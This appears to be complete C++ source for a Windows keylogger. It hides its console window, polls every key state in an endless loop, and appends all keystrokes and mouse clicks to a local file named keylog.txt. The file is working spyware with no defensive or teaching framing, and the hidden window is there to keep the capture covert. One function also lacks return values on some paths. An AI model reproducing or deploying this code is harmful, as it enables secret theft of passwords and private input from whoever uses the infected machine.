#include <iostream>
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <conio.h>
#include <fstream>

using namespace std;
void writetofile(LPCSTR text) //function that creates keylog file
{
	ofstream logfile;
	logfile.open("keylog.txt", fstream::app);
	logfile << text;
	logfile.close();

}

bool keyislogged(int key) //logs special keys
{
	switch (key)
	{
	case VK_SPACE: //space
		cout << "  ";
		writetofile(" *space* ");
		break;
	case VK_RETURN: //return key
		cout << "\n";
		writetofile("\n");
		break;
	case VK_SHIFT: //shift key
		cout << "*shift*";
		writetofile(" *shift* ");
		break;
	case VK_BACK: //backspace
		cout << "\b";
		writetofile("\b");
		break;
	case VK_LBUTTON: //left mouse click
		cout << " *lclick* ";
		writetofile(" *lclick* ");
		break;
	case VK_RBUTTON: //right mouse click
		cout << " *rclick* ";
		writetofile(" *rclick* ");
		break;
	default:
		return false;
	}
}
int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);//hides console
	char i;
	while (true)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				if (keyislogged(i) == false)
				{
					cout << i;
					ofstream logfile;
					logfile.open("keylog.txt", fstream::app);
					logfile << i;
					logfile.close();

				}
			}
		}
	}
	return 0;

}